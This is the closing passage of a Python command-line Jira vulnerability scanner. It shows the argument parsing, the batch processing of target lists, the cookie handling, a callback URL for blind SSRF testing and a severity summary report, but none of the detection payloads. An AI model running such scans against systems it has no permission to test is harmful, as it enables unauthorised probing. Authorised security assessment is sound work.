  python3 jira_scanner.py -u https://jira.example.com --callback-url https://your-callback-server.com
"""
    print(usage)


def main():
    parser = argparse.ArgumentParser(description="Advanced Jira Security Assessment Tool", add_help=False)
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-f', '--file', help='File containing URLs')
    parser.add_argument('-c', '--cookie', help='Authentication cookie')
    parser.add_argument('-o', '--output', default='output/', help='Output directory')
    parser.add_argument('-i', '--insecure', action='store_true', help='Disable SSL verification')
    parser.add_argument('-t', '--timeout', type=int, default=15, help='Request timeout')
    parser.add_argument('-r', '--retries', type=int, default=3, help='Number of retries')
    parser.add_argument('--callback-url', help='Callback URL for blind SSRF testing')
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    
    args = parser.parse_args()
    
    if args.help or (not args.url and not args.file):
        print_usage()
        return
    
    # Create output directory if it doesn't exist
    if not os.path.exists(args.output):
        try:
            os.makedirs(args.output)
        except OSError as e:
            print(f"{Colors.RED}Error creating output directory: {e}{Colors.RESET}")
            return
    
    # Initialize scanner
    scanner = JiraSecurityScanner(
        verify_ssl=not args.insecure,
        timeout=args.timeout,
        retries=args.retries,
        callback_url=args.callback_url
    )
    
    # Set authentication cookie if provided
    if args.cookie:
        scanner.session.headers['Cookie'] = args.cookie
    
    # Disable SSL warnings if insecure flag is used
    if args.insecure:
        print(f"{Colors.YELLOW}Warning: SSL verification disabled{Colors.RESET}")
    
    targets = []
    
    # Process input
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"{Colors.CYAN}Loaded {len(targets)} targets from file{Colors.RESET}")
        except FileNotFoundError:
            print(f"{Colors.RED}Error: File {args.file} not found{Colors.RESET}")
            return
        except Exception as e:
            print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
            return
    else:
        targets = [args.url]
    
    # Remove duplicates while preserving order
    targets = list(dict.fromkeys(targets))
    
    try:
        total_vulnerabilities = 0
        
        for i, target in enumerate(targets, 1):
            print(f"\n{Colors.CYAN}[{i}/{len(targets)}] Scanning: {target}{Colors.RESET}")
            
            # Scan target
            vulnerabilities_found = scanner.scan_target(target)
            
            if vulnerabilities_found:
                total_vulnerabilities += len(scanner.vulnerabilities)
                print(f"{Colors.GREEN}Scan completed. Found {len(scanner.vulnerabilities)} vulnerabilities{Colors.RESET}")
            else:
                print(f"{Colors.GRAY}Scan completed. No vulnerabilities found{Colors.RESET}")
        
        # Generate final report
        if scanner.vulnerabilities:
            report_json, report_txt = scanner.generate_report(args.output)
            
            print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
            print(f"{Colors.GREEN}Scan Summary{Colors.RESET}")
            print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
            print(f"Total targets scanned: {len(targets)}")
            print(f"Total vulnerabilities found: {total_vulnerabilities}")
            
            summary = {
                'critical': len([v for v in scanner.vulnerabilities if v['severity'] == 'CRITICAL']),
                'high': len([v for v in scanner.vulnerabilities if v['severity'] == 'HIGH']),
                'medium': len([v for v in scanner.vulnerabilities if v['severity'] == 'MEDIUM']),
                'low': len([v for v in scanner.vulnerabilities if v['severity'] == 'LOW'])
            }
            
            print(f"  {Colors.RED}Critical: {summary['critical']}{Colors.RESET}")
            print(f"  {Colors.MAGENTA}High: {summary['high']}{Colors.RESET}")
            print(f"  {Colors.YELLOW}Medium: {summary['medium']}{Colors.RESET}")
            print(f"  {Colors.BLUE}Low: {summary['low']}{Colors.RESET}")
            print(f"\nReports saved to: {args.output}")
        else:
            print(f"\n{Colors.GRAY}No vulnerabilities found across all targets{Colors.RESET}")
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Scan interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}Unexpected error: {e}{Colors.RESET}")


if __name__ == "__main__":
    main()
